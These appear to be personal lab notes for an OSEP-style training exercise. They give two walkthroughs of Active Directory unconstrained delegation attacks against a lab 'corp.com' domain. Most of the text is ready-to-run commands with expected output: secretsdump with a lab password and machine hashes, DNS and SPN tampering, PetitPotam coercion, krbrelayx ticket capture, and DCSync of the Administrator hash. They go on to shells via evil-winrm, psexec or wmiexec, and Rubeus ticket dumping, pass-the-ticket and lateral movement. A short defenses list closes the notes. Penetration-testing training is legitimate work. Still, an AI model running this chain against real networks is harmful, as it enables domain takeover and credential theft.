# **krbrelayx Unconstrained Delegation Attack (OSEP 23.1.2)**

## **Prerequisites**

- DC01: 192.168.196.100
- FILES01: 192.168.196.104
- Kali IP: 192.168.45.194
- FILES01$ AES256: `6a4034ac0dfa0120da20ada07727db56ce8376c402e69545e6862515c537d752`
- FILES01$ NTLM: `b76abf58fbc1df8cc5dfa7b73e2356c5`
## **Step 1: Configure DNS & Kerberos**

```bash
sudo tee /etc/resolv.conf > /dev/null <<EOF
nameserver 192.168.196.100
EOF

sudo tee /etc/krb5.conf > /dev/null <<EOF
[libdefaults]
    default_realm = CORP.COM
    dns_lookup_realm = false
    dns_lookup_kdc = false
[realms]
    CORP.COM = {
        kdc = dc01.corp.com
        admin_server = dc01.corp.com
    }
[domain_realm]
    .corp.com = CORP.COM
    corp.com = CORP.COM
EOF
```
## **Step 2: Extract FILES01$ Credentials**

```bash
impacket-secretsdump corp/adam:4Toolsfigure3@192.168.196.104
# Extract from output:
# CORP\FILES01$:aes256-cts-hmac-sha1-96:6a4034ac0dfa0120da20ada07727db56ce8376c402e69545e6862515c537d752
# CORP\FILES01$:aad3b435b51404eeaad3b435b51404ee:b76abf58fbc1df8cc5dfa7b73e2356c5
```
## **Step 3: Get FILES01$ TGT**

```bash
cd ~/Documents/krbrelayx
impacket-getTGT corp.com/files01$ -aesKey 6a4034ac0dfa0120da20ada07727db56ce8376c402e69545e6862515c537d752 -dc-ip 192.168.196.100
export KRB5CCNAME=/home/kali/Documents/krbrelayx/files01$.ccache
```
## **Step 4: Add DNS Record**

```bash
bloodyAD -d corp.com -u 'files01$' -k --host dc01.corp.com add dnsRecord attacker 192.168.45.194

# Verify
nslookup attacker.corp.com  # Should return: 192.168.45.194
```
## **Step 5: Add SPN (CRITICAL: -a flag required)**

```bash
# The -a flag uses msDS-AdditionalDnsHostName to bypass permission restrictions
python3 addspn.py -u 'CORP\FILES01$' -p aad3b435b51404eeaad3b435b51404ee:b76abf58fbc1df8cc5dfa7b73e2356c5 -s HOST/attacker.corp.com -t FILES01$ -a dc01.corp.com

# Expected: [+] SPN Modified successfully
```

**Why -a flag is needed:** Without it, you get "constrained violation" error. The `-a` flag adds the SPN via msDS-AdditionalDnsHostName attribute instead of direct servicePrincipalName modification.
## **Step 6: Download PetitPotam**

```bash
cd ~/Documents/krbrelayx
wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
```
## **Step 7: Start krbrelayx (Terminal 1)**

```bash
sudo python3 krbrelayx.py -aesKey 6a4034ac0dfa0120da20ada07727db56ce8376c402e69545e6862515c537d752

# Expected output:
# [*] Running in unconstrained delegation abuse mode
# [*] Servers started, waiting for connections
# Leave this running!
```
## **Step 8: Trigger Coercion (Terminal 2)**

```bash
cd ~/Documents/krbrelayx
export KRB5CCNAME=/home/kali/Documents/krbrelayx/files01$.ccache

python3 PetitPotam.py -u 'files01$' -hashes aad3b435b51404eeaad3b435b51404ee:b76abf58fbc1df8cc5dfa7b73e2356c5 -d corp.com attacker.corp.com dc01.corp.com

# Expected: [+] Attack worked!
# Check Terminal 1 for: [*] Saving ticket in DC01$@CORP.COM_krbtgt@CORP.COM.ccache
```
## **Step 9: Verify Ticket Capture**

```bash
ls -la *.ccache
# Should see: DC01$@CORP.COM_krbtgt@CORP.COM.ccache
```
## **Step 10: DCSync Administrator Hash**

### **Primary Method: Request CIFS Service Ticket First**

```bash
# Export the captured DC01$ TGT
export KRB5CCNAME=DC01\$@CORP.COM_krbtgt@CORP.COM.ccache

# Request CIFS service ticket (needed for SMB access)
impacket-getST -k -no-pass -spn cifs/dc01.corp.com corp.com/DC01\$ -dc-ip 192.168.196.100

# Use the CIFS ticket for secretsdump
export KRB5CCNAME=DC01\$@cifs_dc01.corp.com@CORP.COM.ccache
impacket-secretsdump -k -no-pass dc01.corp.com -just-dc-user Administrator

# Expected output:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_HASH]:::
```

**Why CIFS ticket is needed:** The TGT alone isn't enough. You need a service ticket (TGS) for the specific service you're accessing. `secretsdump` uses SMB/CIFS to connect, so you need a CIFS service ticket. The automatic TGS request process was timing out, so manually requesting it works.

### **Alternative: Request LDAP Service Ticket**

```bash
# LDAP is what DCSync actually uses
impacket-getST -k -no-pass -spn ldap/dc01.corp.com corp.com/DC01\$ -dc-ip 192.168.196.100
export KRB5CCNAME=DC01\$@ldap_dc01.corp.com@CORP.COM.ccache
impacket-secretsdump -k -no-pass dc01.corp.com -just-dc-user Administrator
```
### **Alternative: Dump Without Filter**

```bash
# If -just-dc-user stalls, dump everything
export KRB5CCNAME=DC01\$@cifs_dc01.corp.com@CORP.COM.ccache
impacket-secretsdump -k -no-pass dc01.corp.com
```
## **Step 11: Get Code Execution**

### **Primary Method: evil-winrm with Administrator Hash**

```bash
# Using the Administrator hash from Step 10
evil-winrm -i 192.168.196.100 -u administrator -H [ADMIN_NTLM_HASH]

# Get flag
type C:\Users\Administrator\Desktop\flag.txt
```
### **Alternative: psexec with Administrator Hash**

```bash
impacket-psexec corp.com/administrator@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:[ADMIN_NTLM_HASH]
type C:\Users\Administrator\Desktop\flag.txt
```
### **Alternative: wmiexec with Administrator Hash**

```bash
impacket-wmiexec corp.com/administrator@dc01.corp.com -hashes aad3b435b51404eeaad3b435b51404ee:[ADMIN_NTLM_HASH]
type C:\Users\Administrator\Desktop\flag.txt
```

**Note:** Direct shell with DC01$ ticket doesn't work because machine accounts don't have local admin rights (can't write to ADMIN$/C$ shares).
## **Troubleshooting**

### **If secretsdump Stalls:**

```bash
# Try with debug mode to see what's happening
export KRB5CCNAME=DC01\$@CORP.COM_krbtgt@CORP.COM.ccache
timeout 30 impacket-secretsdump -k -no-pass -debug dc01.corp.com 2>&1 | tail -100

# Or request service ticket manually (see Step 10)
```
### **If "Clock skew too great" Error:**

```bash
# Install and use rdate
sudo apt install rdate -y
sudo rdate -n 192.168.196.100

# Or use ntpsec
sudo apt install ntpsec-ntpdate -y
sudo ntpdate 192.168.196.100
```
### **If DNS Not Resolving:**

```bash
cat /etc/resolv.conf  # Should show: nameserver 192.168.196.100
nslookup dc01.corp.com  # Should return: 192.168.196.100
```
### **If PetitPotam Fails:**

```bash
# Try printerbug instead
python3 printerbug.py -k -dc-ip 192.168.196.100 dc01.corp.com attacker.corp.com

# Ensure krbrelayx is running in Terminal 1
```
## **Quick Command Reference**

```bash
# Full attack chain
sudo tee /etc/resolv.conf > /dev/null <<< "nameserver 192.168.196.100"
cd ~/Documents/krbrelayx

# Get credentials
impacket-secretsdump corp/adam:4Toolsfigure3@192.168.196.104

# Setup
impacket-getTGT corp.com/files01$ -aesKey 6a4034ac0dfa0120da20ada07727db56ce8376c402e69545e6862515c537d752 -dc-ip 192.168.196.100
export KRB5CCNAME=/home/kali/Documents/krbrelayx/files01$.ccache
bloodyAD -d corp.com -u 'files01$' -k --host dc01.corp.com add dnsRecord attacker 192.168.45.194
python3 addspn.py -u 'CORP\FILES01$' -p aad3b435b51404eeaad3b435b51404ee:b76abf58fbc1df8cc5dfa7b73e2356c5 -s HOST/attacker.corp.com -t FILES01$ -a dc01.corp.com

# Download PetitPotam if needed
wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py

# Terminal 1: Start relay
sudo python3 krbrelayx.py -aesKey 6a4034ac0dfa0120da20ada07727db56ce8376c402e69545e6862515c537d752

# Terminal 2: Coerce authentication
python3 PetitPotam.py -u 'files01$' -hashes aad3b435b51404eeaad3b435b51404ee:b76abf58fbc1df8cc5dfa7b73e2356c5 -d corp.com attacker.corp.com dc01.corp.com

# Exploit (request service ticket first!)
export KRB5CCNAME=DC01\$@CORP.COM_krbtgt@CORP.COM.ccache
impacket-getST -k -no-pass -spn cifs/dc01.corp.com corp.com/DC01\$ -dc-ip 192.168.196.100
export KRB5CCNAME=DC01\$@cifs_dc01.corp.com@CORP.COM.ccache
impacket-secretsdump -k -no-pass dc01.corp.com -just-dc-user Administrator

# Get shell
evil-winrm -i 192.168.196.100 -u administrator -H [ADMIN_HASH]
```
## **Key Concepts Explained**

### **What is CIFS?**

**CIFS = Common Internet File System** (also called SMB - Server Message Block)

- It's the protocol Windows uses for file sharing and remote administration
- When you access `\\server\share`, you're using CIFS/SMB
- `secretsdump` needs to connect via SMB to access the registry and perform DCSync
- That's why you need a **CIFS service ticket** - it authorizes your SMB connection

### **Kerberos Ticket Types:**

1. **TGT (Ticket Granting Ticket)** - Proves your identity, used to request service tickets
    - Example: `DC01$@CORP.COM_krbtgt@CORP.COM.ccache`
2. **TGS (Ticket Granting Service / Service Ticket)** - Grants access to specific service
    - Example: `DC01$@cifs_dc01.corp.com@CORP.COM.ccache` (for CIFS)
    - Example: `DC01$@ldap_dc01.corp.com@CORP.COM.ccache` (for LDAP)

### **Why Manual Service Ticket Request Was Needed:**

- Impacket normally requests service tickets automatically using your TGT
- In this case, that auto-request was timing out/failing
- Manually requesting with `impacket-getST` bypassed the broken auto-request
- Once you had the CIFS service ticket, `secretsdump` could connect properly

### **Why DC01$ Can't Get Shell Directly:**

- **DC01$** is a machine account with **DCSync rights** (can replicate AD)
- But it's **NOT a local administrator** on DC01
- Can't write to `ADMIN$` or `C$` shares → `psexec` fails
- **Solution:** Use DCSync to get Administrator hash, then use that for shell access
## **Attack Flow Summary**

1. ✅ Compromise FILES01 → Get FILES01$ credentials
2. ✅ Add fake DNS record pointing to Kali
3. ✅ Add SPN to FILES01$ (with `-a` flag)
4. ✅ Start krbrelayx to capture tickets
5. ✅ Force DC01 to authenticate (PetitPotam) → Capture DC01$ TGT
6. ✅ Request CIFS service ticket using DC01$ TGT
7. ✅ Use CIFS ticket to DCSync Administrator hash
8. ✅ Use Administrator hash for shell access → Get flag

**Critical Success Factors:**

- `-a` flag for addspn.py (bypasses permission restrictions)
- SPN required (forces Kerberos vs NTLM)
- Manually request service tickets when auto-request fails
- Use Administrator hash for shell (DC01$ lacks local admin rights)





## Another walkthrough
# Unconstrained Delegation Attack
## Overview

When enabled on a computer/service account, any user authenticating to that service sends their TGT along with their Service Ticket. The server caches this TGT in LSASS memory, allowing it to impersonate the user to *any* service in the domain. If you compromise a server with unconstrained delegation, you can steal TGTs from every user who connects.
## Key Concepts

| Term | Definition |

|------|------------|

| **KDC** | Key Distribution Center - issues all Kerberos tickets (runs on DCs) |

| **TGT** | Ticket Granting Ticket - your "master" ticket proving identity |

| **Service Ticket (TGS)** | Ticket for accessing one specific service |

| **krbtgt** | AD account that signs/encrypts all TGTs |

| **SPN** | Service Principal Name - unique ID for a service (e.g., `cifs/server.domain.com`) |

| **LSASS** | Windows process that caches credentials/tickets in memory |
## Attack Flow

`ENUMERATE → COMPROMISE TARGET → WAIT FOR USER AUTH → EXTRACT TGT → INJECT TICKET → LATERAL MOVEMENT`
## Phase 1: Enumeration

```powershell

# PowerView

Get-DomainComputer -Unconstrained

Get-DomainUser -Unconstrained  

# Native AD Module

Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,servicePrincipalName  

# Raw LDAP (no tools)

([adsisearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))").FindAll()  

# dsquery

dsquery * -filter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" -attr cn

```

**Look for:** `useraccountcontrol : TRUSTED_FOR_DELEGATION` — Ignore DCs (enabled by default). 

## Phase 2: Trigger User Authentication

Victim must connect to compromised server. Force it with:

```powershell

dir \\target-server\share
net use \\target-server\share

```

Or wait for legitimate connections (file shares, web apps, print services). 

## Phase 3: Extract Tickets

```powershell

# Dump all tickets (run as admin)

.\Rubeus.exe dump /nowrap 

# Monitor for new TGTs in real-time

.\Rubeus.exe monitor /interval:5 /nowrap  

# Filter for specific user

.\Rubeus.exe monitor /interval:5 /filteruser:admin /nowrap

```

**Look for:** `ServiceName: krbtgt/CORP.COM` — this indicates a TGT (not just a service ticket). Copy the `Base64EncodedTicket` value.

  

## Phase 4: Inject Ticket (Pass-the-Ticket)

```powershell

.\Rubeus.exe ptt /ticket:doIFhDCCBYCgAwIBBaEDAgEW...  

# Verify injection
klist

```

  

## Phase 5: Validate Access & Lateral Movement

```powershell

# Test access

dir \\other-server\c$
dir \\fileserver\home$\username
dir \\dc01\admin$

  
# WinRM

Enter-PSSession -ComputerName target-server  

# WMI execution

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami > C:\temp\out.txt" -ComputerName target-server

  
# DCSync (if Domain Admin TGT)

mimikatz# lsadump::dcsync /user:krbtgt

```

  

## Full Attack Sequence

```powershell

# 1. Enumerate (from any domain machine)

Import-Module .\PowerView.ps1

Get-DomainComputer -Unconstrained
 

# 2. On compromised server - dump tickets

.\Rubeus.exe dump /nowrap
  

# 3. Trigger victim: (on victim machine) dir \\files01\shares

  
# 4. Dump again - find new TGT

.\Rubeus.exe dump /nowrap
  

# 5. Inject stolen TGT

.\Rubeus.exe ptt /ticket:<base64-ticket>
  

# 6. Verify and access

klist

dir \\target\share

```
## Defenses

- **Protected Users group** — blocks delegation for members

- **"Account is sensitive and cannot be delegated"** — per-account flag

- **Disable unconstrained delegation** — use constrained/RBCD instead

  ## Quick Reference

| Task | Command |

|------|---------|

| Find unconstrained delegation | `Get-DomainComputer -Unconstrained` |

| Dump tickets | `Rubeus.exe dump /nowrap` |

| Monitor for tickets | `Rubeus.exe monitor /interval:5 /nowrap` |

| Inject ticket | `Rubeus.exe ptt /ticket:<base64>` |

| Verify tickets | `klist` |

| Test access | `dir \\server\share` |